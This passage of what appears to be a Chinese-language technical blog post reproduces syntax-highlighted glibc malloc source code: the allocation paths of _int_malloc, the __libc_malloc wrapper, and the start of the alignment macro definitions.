class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">             != victim);</span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">     it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">     the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">     bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">     chunks are placed in bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">     near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">     do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">     otherwise need to expand memory to service a &quot;small&quot; request.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">         bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">         (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">         that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">         The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">         when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      ++idx;</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      block = idx2block (idx);</span><br><span class="line">      <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">      bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (;; )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">          <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                    <span class="keyword">goto</span> use_top;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">              bit = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">          <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">              assert (bit != <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">          victim = last (bin);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">          <span class="keyword">if</span> (victim == bin)</span><br><span class="line">            &#123;</span><br><span class="line">              av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">              assert ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* unlink */</span></span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">                  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                    av-&gt;last_remainder = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//__libc_malloc</span></span><br><span class="line"><span class="comment">/*------------------------ Public wrappers. --------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//malloc 相关宏定义</span></span><br><span class="line"><span class="comment">/*申请的堆块对齐的宏定义*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> !SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_16)</span></span><br><span class="line"><span class="comment">/* This is the correct definition when there is no past ABI to constrain it.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Among configurations with a past ABI constraint, it differs from</span></span><br><span class="line"><span class="comment">   2*SIZE_SZ only on powerpc32.  For the time being, changing this is</span></span><br><span class="line"><span class="comment">   causing more compatibility problems due to malloc_get_state and</span></span><br><span class="line"><span 